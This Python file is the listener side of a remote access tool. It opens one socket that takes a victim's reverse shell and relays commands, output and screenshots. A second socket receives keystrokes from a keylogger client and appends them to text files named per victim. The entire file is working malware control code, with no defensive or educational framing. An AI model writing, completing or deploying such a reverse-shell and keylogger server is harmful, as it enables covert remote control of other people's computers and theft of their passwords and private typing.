import io
import socket
import threading
from contextlib import nullcontext

from PIL import Image

SERVER_HOST = socket.gethostbyname(socket.gethostname())
SERVER_PORT_KEYLOGGER = 5000
SERVER_PORT_SHELL = 5005
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
# create a socket object
s1 = socket.socket()
s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s1.bind((SERVER_HOST,SERVER_PORT_SHELL))
s1.listen(5)

s2 = socket.socket()
s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s2.bind((SERVER_HOST,SERVER_PORT_KEYLOGGER))
s2.listen(5)



def reverse_shell(s1):
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT_SHELL} ...")
    socket, client_add = s1.accept()
    print(f"{client_add[0]}:{client_add[1]} Connected!")
    cwd = socket.recv(BUFFER_SIZE).decode()
    print('after receive cwd')
    while True:
        command = input(f"{cwd} $> ")
        if not command.strip():
            continue
        socket.send(command.encode())
        if command.lower() == "exit":
            break
        output = socket.recv(BUFFER_SIZE).decode()
        print(output)
        str1, str2 = output.split(SEPARATOR)
        if (str1 != ""):
            print(str1)

        if (str2 == 'image'):
            img_size = int(str1)
            img_data = b''
            while len(img_data) < img_size:
                packet = socket.recv(4096)
                if not packet:
                    break
                img_data += packet
            img = Image.open(io.BytesIO(img_data))
            img.show()
        elif (str1 == 'key'):
            print(f"{str2} is pressed!\n")
        else:
            results, cwd = output.split(SEPARATOR)


def key_logger(s2):
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT_KEYLOGGER} ...")
    socket, client_add = s2.accept()
    print(f"{client_add[0]}:{client_add[1]} Connected!")
    while True:
        output = socket.recv(BUFFER_SIZE).decode()
        str1, str2 = output.split(SEPARATOR)
        with open(f'{str1}.txt', "a",encoding='utf-8') as file:
            try:
                file.write(f"{str2}\n")
            except Exception as e:
                print(f"Error logging key: {e}")

t1 = threading.Thread(target=reverse_shell, args=(s1,))
t2 = threading.Thread(target=key_logger, args=(s2,))
t1.start()
t2.start()

t1.join()
t2.join()



